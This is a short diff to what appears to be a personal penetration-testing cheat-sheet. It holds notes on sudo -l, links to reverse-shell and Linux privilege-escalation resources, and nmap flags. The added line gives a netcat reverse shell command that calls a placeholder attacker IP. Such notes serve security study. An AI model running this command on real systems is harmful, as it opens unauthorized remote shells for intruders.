@@ -45,6 +45,7 @@
 - sudo -l: gives the files you can access without root password
 - reverseshells: https://github.com/infodox/python-pty-shells
 - privilege escalation: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+- reverse shell: nc -nv [attackerIP] -e bash
 
 ## nmap:
 - sT -> three way handshake
